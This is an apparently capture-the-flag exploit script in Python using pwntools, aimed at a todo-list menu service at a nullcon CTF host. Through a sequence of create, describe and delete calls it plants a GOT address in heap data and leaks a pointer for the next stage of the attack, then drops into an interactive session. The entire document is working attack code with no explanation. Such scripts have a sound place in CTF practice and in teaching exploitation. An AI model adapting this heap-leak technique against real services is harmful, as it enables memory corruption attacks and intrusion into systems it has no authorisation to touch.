from pwn import *

MENU = '''
Menu:
(1) Create a new todo
(2) Set description for a todo
(3) Delete an existing todo
(4) Print todos
(5) Exit

> 
'''

PROMPT = "> "

def get_prompt():
	return p.recvuntil(PROMPT)

def create_todo(todo):
	p.sendline("1")
	p.recvuntil("topic: ")
	p.sendline(todo)
	get_prompt()

def set_description(name,desc,desc_len):
	p.sendline("2")
	p.recvuntil("topic: ")
	p.sendline(name)
	p.recvuntil("Desc length: ")
	p.sendline(str(desc_len))
	p.recvuntil("Desc: ")
	p.send(desc.ljust(desc_len,"\x00"))
	get_prompt()

def list_todo():
	p.sendline("4")
	ret = {}
	data = get_prompt().strip(PROMPT).strip().split("\n")
	for x in data:
		key,value = x.split(" - ")
		ret[key] = value
	return ret

def delete_todo(todo):
	p.sendline("3")
	p.recvuntil("topic: ")
	p.sendline(todo)
	get_prompt()

p = remote("pwn.ctf.nullcon.net", 4003)

puts_got = 0x601F90
strlen_got = 0x601F98

desc = "B"*0x8+p64(strlen_got)
desc = desc.strip("\x00")

create_todo("1"*0x30)
set_description("1"*0x30,desc,len(desc))
create_todo("2"*0x30)
delete_todo("1"*0x30)
create_todo("3"*0x30)
create_todo("4"*0x30)

todos = list_todo()
leak = u64(todos["4"*0x30].ljust(8,"\x00"))

log.info("LEAK: 0x%x"%leak)
p.interactive()